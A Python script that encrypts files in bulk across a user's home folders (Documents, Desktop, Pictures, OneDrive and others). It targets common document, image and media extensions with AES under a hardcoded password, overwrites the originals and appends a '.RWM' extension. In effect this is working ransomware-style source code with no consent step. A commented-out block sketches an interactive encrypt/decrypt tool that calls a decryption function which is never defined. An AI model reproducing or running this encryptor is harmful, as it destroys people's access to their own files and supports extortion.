import os
import sys
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad



password_key = "password123"

extension = ".RWM"

TargetFiles = [
    '.pdf',
    '.xls',
    '.ppt',
    '.doc',
    '.accd',
    '.rtf',
    '.txt',
    '.py',
    '.csv',
    '.jpg',
    '.jpeg',
    '.png',
    '.gif',
    '.avi',
    '.midi',
    '.mov',
    '.mp3',
    '.mp4',
    '.mpeg',
    '.mpeg2',
    '.mpeg3',
    '.mpg',
    '.mkv',
    '.ogg'
]

Folders = [
    "Documents",
    "Downloads",
    "Favorites",
    "Links",
    "Music",
    "Pictures",
    "Saved Games",
    "Videos",
    "OneDrive",
    "Desktop"
]


def encrypt_file(password, file_path):
    salt = get_random_bytes(16)
    iv = get_random_bytes(16)
    
    key = PBKDF2(password, salt, dkLen=32, count=1000000)
    
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    
    encrypted_data = salt + iv + ciphertext
    
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)
    
    os.rename(file_path, file_path + extension)
    return file_path + extension



def check_file_extension(filename):
    for ext in TargetFiles:
        if filename.lower().endswith(ext.lower()):
            return True
    return False



def startEncrypting():
    user_folder = os.path.expanduser("~")
    # print(f"user_folder: {user_folder}")

    for folders in Folders:
        full_folders_path = os.path.join(user_folder, folders)
           
        # print(f"full_folders_path: {full_folders_path}")

        for root, dirs, files in os.walk(full_folders_path):
            for file in files:
                full_path = os.path.join(root, file)
                # print(f"full_path: {full_path}")

                # if not full_path.endswith(LocalFileName):
                        # print(full_path)

                if check_file_extension(full_path):
                    # print(full_path)
                    output_path = encrypt_file(password_key.encode(), full_path)
                    print(f"SUCCESS: File Encrypted: {output_path}")


if __name__ == "__main__":
    print("---------------------------")
    startEncrypting()
    print("---------------------------")






"""
def main():
    print("AES File Encryption/Decryption Tool")
    print("-----------------------------------")
    print("Files will be overwritten in place")
    print("[!] Original files will be replaced with processed versions")
    
    file_path = input("\nEnter file path: ").strip()
    
    if not os.path.exists(file_path):
        print(f"\nError: File not found - {file_path}")
        sys.exit(1)
    
    password = input("Enter password: ").encode()
    
    try:
        if file_path.lower().endswith(extension.lower()):
            output_path = decrypt_file(password, file_path)
            print(f"\nSUCCESS: File decrypted and saved as {output_path}")
        else:
            output_path = encrypt_file(password, file_path)
            print(f"\nSUCCESS: File encrypted and saved as {output_path}")
        
        print("\nSecurity Notice:")
        print("- The original file has been overwritten and replaced")
        print("- Only the processed version remains")
        print("- Keep your password safe - decryption is impossible without it")
        
    except ValueError:
        print("\nERROR: Incorrect password or corrupted file")

    except Exception as e:
        print(f"\nERROR: Operation failed - {str(e)}")
"""
